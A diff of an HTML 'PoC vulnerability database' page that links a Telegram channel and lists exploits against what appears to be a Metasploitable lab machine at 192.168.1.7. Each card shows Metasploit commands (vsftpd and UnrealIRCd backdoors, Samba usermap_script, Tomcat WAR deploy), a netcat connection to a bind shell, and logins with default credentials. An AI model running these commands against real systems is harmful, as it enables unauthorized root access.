@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Drak24Evil | Professional PoC Terminal</title>
+    <title>Drak24Evil | Pro PoC Terminal</title>
     <style>
         :root {
             --cyber-blue: #00d4ff;
@@ -12,13 +12,13 @@
             --dark-bg: #0a0b0c;
             --card-bg: #14171a;
             --accent-green: #00ff41;
-            --modal-bg: #1a1d21;
+            --modal-bg: #111;
         }
 
         body {
             background-color: var(--dark-bg);
             color: #e1e1e1;
-            font-family: 'Segoe UI', Tahoma, sans-serif;
+            font-family: 'Segoe UI', sans-serif;
             margin: 0; padding: 0;
         }
 
@@ -26,201 +26,139 @@
 
         header {
             background: var(--card-bg);
-            padding: 25px;
+            padding: 20px;
             border-bottom: 3px solid var(--cyber-blue);
             display: flex;
             justify-content: space-between;
             align-items: center;
             margin-bottom: 30px;
+            border-radius: 0 0 10px 10px;
         }
-
-        .header-title h1 { margin: 0; color: var(--cyber-blue); letter-spacing: 2px; font-size: 1.5em; }
 
         .grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
-            gap: 20px;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 15px;
         }
 
         .card {
             background: var(--card-bg);
             border: 1px solid #333;
-            padding: 20px;
+            padding: 15px;
             border-radius: 8px;
             cursor: pointer;
-            transition: 0.3s;
+            transition: 0.2s;
+            position: relative;
         }
 
-        .card:hover { border-color: var(--cyber-blue); transform: scale(1.02); }
+        .card:hover { border-color: var(--cyber-blue); background: #1c2024; }
 
-        .port-label { color: var(--cyber-blue); font-weight: bold; font-family: monospace; }
+        .port-num { color: var(--cyber-blue); font-weight: bold; font-family: monospace; }
         
-        /* Modal Styles */
-        .modal {
+        /* Modal Style */
+        .modal-overlay {
             display: none;
             position: fixed;
-            z-index: 1000;
+            z-index: 9999;
             left: 0; top: 0;
             width: 100%; height: 100%;
-            background-color: rgba(0,0,0,0.9);
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(5px);
+        }
+
+        .modal-box {
+            background: var(--modal-bg);
+            margin: 5% auto;
+            padding: 25px;
+            width: 90%;
+            max-width: 650px;
+            border: 1px solid var(--cyber-blue);
+            border-radius: 12px;
+            position: relative;
+            max-height: 85vh;
             overflow-y: auto;
         }
 
-        .modal-content {
-            background-color: var(--modal-bg);
-            margin: 5% auto;
-            padding: 30px;
-            border: 1px solid var(--cyber-blue);
-            width: 80%;
-            max-width: 700px;
-            border-radius: 10px;
-            box-shadow: 0 0 30px rgba(0, 212, 255, 0.2);
-        }
-
-        .close {
-            color: #aaa;
-            float: right;
-            font-size: 28px;
-            font-weight: bold;
+        .close-btn {
+            position: absolute;
+            top: 15px; right: 20px;
+            font-size: 24px; color: #fff;
             cursor: pointer;
         }
 
-        .poc-header { border-bottom: 1px solid #444; margin-bottom: 20px; padding-bottom: 10px; }
-        .poc-title { color: var(--critical-red); font-size: 1.4em; font-weight: bold; }
-        
-        .section-title { color: var(--cyber-blue); font-size: 0.9em; text-transform: uppercase; margin-top: 15px; display: block; font-weight: bold; }
-        .section-content { background: #000; padding: 10px; border-radius: 5px; margin-top: 5px; border-left: 3px solid var(--accent-green); white-space: pre-wrap; font-family: monospace; font-size: 0.9em; }
+        .poc-label { color: var(--cyber-blue); font-size: 0.75em; text-transform: uppercase; font-weight: bold; margin-top: 15px; display: block; }
+        .poc-content { background: #000; padding: 12px; border-radius: 6px; margin-top: 4px; border-left: 3px solid var(--accent-green); font-family: monospace; font-size: 0.9em; }
 
-        .tag { display: inline-block; padding: 2px 8px; border-radius: 3px; font-size: 0.7em; margin-right: 5px; text-transform: uppercase; font-weight: bold; }
-        .tag-crit { background: var(--critical-red); color: #fff; }
+        .sev-tag { padding: 3px 8px; border-radius: 4px; font-size: 0.7em; font-weight: bold; float: right; }
+        .crit { background: var(--critical-red); color: white; }
 
-        footer { text-align: center; padding: 40px; color: #555; }
-        a { color: var(--cyber-blue); text-decoration: none; }
+        .telegram-btn { background: #24A1DE; color: white; text-decoration: none; padding: 8px 15px; border-radius: 5px; font-size: 0.9em; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <header>
-        <div class="header-title">
-            <h1>DRAK24EVIL SECURITY HUB</h1>
-            <span style="font-size: 0.8em; color: #777;">POC ARCHIVE // CLICK CARD TO GENERATE REPORT</span>
+        <div>
+            <h2 style="margin:0; color:var(--cyber-blue);">DRAK24EVIL AUDIT</h2>
+            <small style="color:#666;">POC VULNERABILITY DATABASE</small>
         </div>
-        <a href="https://t.me/Drak24Evil" target="_blank" style="color: #24A1DE; font-weight: bold;">t.me/Drak24Evil</a>
+        <a href="https://t.me/Drak24Evil" class="telegram-btn" target="_blank">Telegram</a>
     </header>
 
-    <div class="grid" id="card-container">
+    <div class="grid" id="mainGrid">
         </div>
+</div>
 
-    <div id="pocModal" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="closeModal()">&times;</span>
-            <div id="poc-data"></div>
-        </div>
+<div id="pocModal" class="modal-overlay">
+    <div class="modal-box">
+        <span class="close-btn" id="closeModal">&times;</span>
+        <div id="pocBody"></div>
     </div>
-
-    <footer>
-        &copy; 2026 Drak24Evil Security Resources. All rights reserved.
-    </footer>
 </div>
 
 <script>
-    const vulnerabilities = [
-        {
-            port: "21",
-            name: "Pre-Auth Remote Code Execution (vsftpd)",
-            severity: "CRITICAL",
-            target: "192.168.1.7",
-            tool: "Metasploit Framework (msfconsole)",
-            method: "Exploitation of vsftpd 2.3.4 'Smile' Backdoor via intentional string trigger.",
-            impact: "Complete root-level system compromise. Full access to files, users, and network traffic.",
-            exploit: "use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.1.7\nexploit"
-        },
-        {
-            port: "445",
-            name: "Unauthenticated Samba RCE (usermap_script)",
-            severity: "CRITICAL",
-            target: "192.168.1.7",
-            tool: "Metasploit Framework",
-            method: "Abusing 'username map script' configuration error in Samba 3.0.20 to 3.0.25rc3.",
-            impact: "Unauthorized execution of arbitrary commands with root privileges.",
-            exploit: "use exploit/multi/samba/usermap_script\nset RHOSTS 192.168.1.7\nexploit"
-        },
-        {
-            port: "1524",
-            name: "Exposed Administrative Shell (Ingreslock)",
-            severity: "CRITICAL",
-            target: "192.168.1.7",
-            tool: "Netcat (nc)",
-            method: "Direct socket connection to an unauthenticated bind shell listening on port 1524.",
-            impact: "Instant interactive root shell access without credentials.",
-            exploit: "nc 192.168.1.7 1524"
-        },
-        {
-            port: "8180",
-            name: "Arbitrary WAR File Deployment (Tomcat)",
-            severity: "CRITICAL",
-            target: "192.168.1.7",
-            tool: "Metasploit Framework",
-            method: "Authenticated access to Manager GUI using default 'tomcat:tomcat' credentials followed by malicious WAR upload.",
-            impact: "Deployment of web shells allowing for remote command execution (RCE).",
-            exploit: "use exploit/multi/http/tomcat_mgr_deploy\nset HttpUsername tomcat\nset HttpPassword tomcat\nset RHOSTS 192.168.1.7\nset RPORT 8180\nexploit"
-        }
-    ];
+const data = [
+    { p: "21", n: "vsftpd 2.3.4 Backdoor", s: "Critical", tool: "Metasploit", m: "Triggered by ':)' in user string.", i: "Full Root RCE", e: "use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.1.7\nexploit" },
+    { p: "22", n: "SSH Default Credentials", s: "High", tool: "SSH Client", m: "Brute force / Default check.", i: "System Access", e: "ssh msfadmin@192.168.1.7\nPassword: msfadmin" },
+    { p: "23", n: "Telnet Cleartext Login", s: "High", tool: "Telnet", m: "Insecure protocol sniffing.", i: "Credential Theft", e: "telnet 192.168.1.7\nLogin: msfadmin / msfadmin" },
+    { p: "80", n: "PHP CGI Arg Injection", s: "Critical", tool: "Metasploit", m: "Query string manipulation.", i: "Web Server RCE", e: "use exploit/multi/http/php_cgi_arg_injection\nset RHOSTS 192.168.1.7\nrun" },
+    { p: "445", n: "Samba Usermap Script", s: "Critical", tool: "Metasploit", m: "Username field injection.", i: "Root Shell", e: "use exploit/multi/samba/usermap_script\nset RHOSTS 192.168.1.7\nexploit" },
+    { p: "1524", n: "Ingreslock Bindshell", s: "Critical", tool: "Netcat", m: "Direct unauthenticated access.", i: "Root Shell", e: "nc 192.168.1.7 1524" },
+    { p: "3306", n: "MySQL No Password", s: "High", tool: "MySQL Client", m: "Default config error.", i: "Database Leak", e: "mysql -h 192.168.1.7 -u root" },
+    { p: "5432", n: "PostgreSQL Payload Exec", s: "Critical", tool: "Metasploit", m: "UDF library injection.", i: "Database RCE", e: "use exploit/linux/postgres/postgres_payload\nset RHOSTS 192.168.1.7\nexploit" },
+    { p: "6667", n: "UnrealIRCd Backdoor", s: "Critical", tool: "Metasploit", m: "Compromised source code.", i: "RCE", e: "use exploit/unix/irc/unreal_ircd_3281_backdoor\nset RHOSTS 192.168.1.7\nexploit" },
+    { p: "8180", n: "Tomcat Manager Deploy", s: "Critical", tool: "Metasploit", m: "Weak credentials + WAR upload.", i: "Application RCE", e: "use exploit/multi/http/tomcat_mgr_deploy\nset HttpUsername tomcat\nset HttpPassword tomcat\nexploit" }
+];
 
-    const container = document.getElementById('card-container');
+const grid = document.getElementById('mainGrid');
+const modal = document.getElementById('pocModal');
+const pocBody = document.getElementById('pocBody');
 
-    vulnerabilities.forEach((v, index) => {
-        const card = document.createElement('div');
-        card.className = 'card';
-        card.onclick = () => openModal(index);
-        card.innerHTML = `
-            <span class="port-label">PORT ${v.port} / TCP</span>
-            <h3>${v.name}</h3>
-            <p style="font-size:0.8em; color:#888;">Click to view HackerOne style PoC report.</p>
-        `;
-        container.appendChild(card);
-    });
+// Create Cards
+data.forEach((item, index) => {
+    const card = document.createElement('div');
+    card.className = 'card';
+    card.innerHTML = `<span class="port-num">PORT ${item.p}</span><span class="sev-tag crit">${item.s}</span><h3>${item.n}</h3>`;
+    card.addEventListener('click', () => showPoc(index));
+    grid.appendChild(card);
+});
 
-    function openModal(index) {
-        const v = vulnerabilities[index];
-        const modal = document.getElementById('pocModal');
-        const data = document.getElementById('poc-data');
-        
-        data.innerHTML = `
-            <div class="poc-header">
-                <span class="tag tag-crit">${v.severity}</span>
-                <div class="poc-title">REPORT: ${v.name}</div>
-            </div>
-            
-            <span class="section-title">TARGET IP</span>
-            <div class="section-content">${v.target}</div>
+function showPoc(i) {
+    const v = data[i];
+    pocBody.innerHTML = `
+        <h2 style="color:var(--critical-red); border-bottom:1px solid #333; padding-bottom:10px;">POC REPORT: ${v.n}</h2>
+        <span class="poc-label">TARGET IP</span><div class="poc-content">192.168.1.7</div>
+        <span class="poc-label">TOOL USED</span><div class="poc-content">${v.tool}</div>
+        <span class="poc-label">METHODOLOGY</span><div class="poc-content">${v.m}</div>
+        <span class="poc-label">BUSINESS IMPACT</span><div class="poc-content">${v.i}</div>
+        <span class="poc-label">EXPLOIT POC COMMANDS</span><div class="poc-content" style="color:var(--accent-green); white-space:pre-wrap;">${v.e}</div>
+    `;
+    modal.style.display = 'block';
+}
 
-            <span class="section-title">TOOL USED</span>
-            <div class="section-content">${v.tool}</div>
-
-            <span class="section-title">METHODOLOGY</span>
-            <div class="section-content">${v.method}</div>
-
-            <span class="section-title">IMPACT</span>
-            <div class="section-content">${v.impact}</div>
-
-            <span class="section-title">EXPLOIT POC COMMANDS</span>
-            <div class="section-content" style="color:var(--accent-green)">${v.exploit}</div>
-        `;
-        
-        modal.style.display = "block";
-    }
-
-    function closeModal() {
-        document.getElementById('pocModal').style.display = "none";
-    }
-
-    window.onclick = function(event) {
-        if (event.target == document.getElementById('pocModal')) {
-            closeModal();
-        }
-    }
+document.getElementById('closeModal').onclick = () => modal.style.display = 'none';
+window.onclick = (e) => { if(e.target == modal) modal.style.display = 'none'; }
 </script>
 
 </body>
